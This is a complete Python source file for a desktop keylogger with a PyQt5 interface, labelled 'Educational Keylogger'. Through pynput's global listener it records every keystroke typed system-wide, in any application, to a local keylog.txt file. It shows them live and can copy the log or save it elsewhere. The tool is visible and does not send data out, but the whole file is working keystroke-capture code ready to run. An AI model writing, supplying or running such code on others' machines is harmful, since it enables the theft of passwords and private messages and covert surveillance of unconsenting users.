import sys
import os
from PyQt5.QtWidgets import (
    QApplication, QWidget, QPushButton, QTextEdit, QVBoxLayout, QHBoxLayout,
    QMessageBox, QFileDialog, QStatusBar, QLabel, QShortcut
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QKeySequence
from pynput.keyboard import Listener

LOG_FILE = "keylog.txt"


class KeyloggerThread(QThread):
    key_logged = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.listener = None

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = f"[{key}]"
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(char)
        except Exception as e:
            # In case of file write error, emit an error signal (could be added)
            pass
        self.key_logged.emit(char)

    def run(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

    def stop(self):
        if self.listener:
            self.listener.stop()
        self.quit()


class KeyloggerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Educational Keylogger")
        self.resize(700, 450)
        self.keylogger_thread = None

        # Layouts
        main_layout = QVBoxLayout()
        btn_layout = QHBoxLayout()
        file_btn_layout = QHBoxLayout()

        # Log display
        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        main_layout.addWidget(self.log_view)

        # Buttons
        self.start_btn = QPushButton("Start Keylogger (Ctrl+S)")
        self.stop_btn = QPushButton("Stop Keylogger (Ctrl+T)")
        self.show_log_btn = QPushButton("Show Log (Ctrl+L)")
        self.clear_log_btn = QPushButton("Clear Log (Ctrl+C)")

        btn_layout.addWidget(self.start_btn)
        btn_layout.addWidget(self.stop_btn)
        btn_layout.addWidget(self.show_log_btn)
        btn_layout.addWidget(self.clear_log_btn)

        main_layout.addLayout(btn_layout)

        # Additional buttons
        self.copy_clipboard_btn = QPushButton("Copy Log to Clipboard (Ctrl+P)")
        self.save_as_btn = QPushButton("Save Log As...")

        file_btn_layout.addWidget(self.copy_clipboard_btn)
        file_btn_layout.addWidget(self.save_as_btn)

        main_layout.addLayout(file_btn_layout)

        self.exit_btn = QPushButton("Exit (Ctrl+Q)")
        main_layout.addWidget(self.exit_btn)

        # Status bar
        self.status_bar = QStatusBar()
        self.status_label = QLabel("Ready")
        self.status_bar.addWidget(self.status_label)
        main_layout.addWidget(self.status_bar)

        self.setLayout(main_layout)

        # Connect buttons to handlers
        self.start_btn.clicked.connect(self.start_keylogger)
        self.stop_btn.clicked.connect(self.stop_keylogger)
        self.show_log_btn.clicked.connect(self.show_log)
        self.clear_log_btn.clicked.connect(self.clear_log)
        self.copy_clipboard_btn.clicked.connect(self.copy_to_clipboard)
        self.save_as_btn.clicked.connect(self.save_log_as)
        self.exit_btn.clicked.connect(self.close)

        # Setup keyboard shortcuts for convenience
        QShortcut(QKeySequence("Ctrl+S"), self, self.start_keylogger)
        QShortcut(QKeySequence("Ctrl+T"), self, self.stop_keylogger)
        QShortcut(QKeySequence("Ctrl+L"), self, self.show_log)
        QShortcut(QKeySequence("Ctrl+C"), self, self.clear_log)
        QShortcut(QKeySequence("Ctrl+P"), self, self.copy_to_clipboard)
        QShortcut(QKeySequence("Ctrl+Q"), self, self.close)

        self.stop_btn.setEnabled(False)  # Initially disable Stop

    def start_keylogger(self):
        if self.keylogger_thread:
            self.status_message("Keylogger already running.")
            return
        self.keylogger_thread = KeyloggerThread()
        self.keylogger_thread.key_logged.connect(self.update_log_view)
        self.keylogger_thread.start()
        self.status_message("Keylogger started.")
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

    def stop_keylogger(self):
        if not self.keylogger_thread:
            self.status_message("Keylogger is not running.")
            return
        self.keylogger_thread.stop()
        self.keylogger_thread.wait()
        self.keylogger_thread = None
        self.status_message("Keylogger stopped.")
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

    def show_log(self):
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                content = f.read()
        except FileNotFoundError:
            content = ""
        self.log_view.setPlainText(content)
        self.status_message("Log loaded into display.")

    def clear_log(self):
        if os.path.exists(LOG_FILE):
            try:
                os.remove(LOG_FILE)
                self.log_view.clear()
                self.status_message("Log file cleared.")
            except Exception as e:
                self.status_message(f"Error clearing log: {str(e)}")
        else:
            self.status_message("Log file does not exist.")

    def copy_to_clipboard(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.log_view.toPlainText())
        self.status_message("Log content copied to clipboard.")
        QMessageBox.information(self, "Copied", "Log content copied to clipboard.")

    def save_log_as(self):
        options = QFileDialog.Options()
        filename, _ = QFileDialog.getSaveFileName(self, "Save Log As", "", "Text Files (*.txt);;All Files (*)", options=options)
        if filename:
            try:
                with open(LOG_FILE, "r", encoding="utf-8") as src:
                    content = src.read()
                with open(filename, "w", encoding="utf-8") as dst:
                    dst.write(content)
                self.status_message(f"Log saved as {filename}")
                QMessageBox.information(self, "Success", f"Log saved as:\n{filename}")
            except Exception as e:
                self.status_message(f"Error saving log: {str(e)}")
                QMessageBox.warning(self, "Error", f"Could not save file:\n{str(e)}")

    def update_log_view(self, text):
        self.log_view.moveCursor(self.log_view.textCursor().End)
        self.log_view.insertPlainText(text)

    def status_message(self, message):
        self.status_label.setText(message)

    def closeEvent(self, event):
        if self.keylogger_thread:
            self.stop_keylogger()
        event.accept()


def main():
    app = QApplication(sys.argv)
    window = KeyloggerApp()
    window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
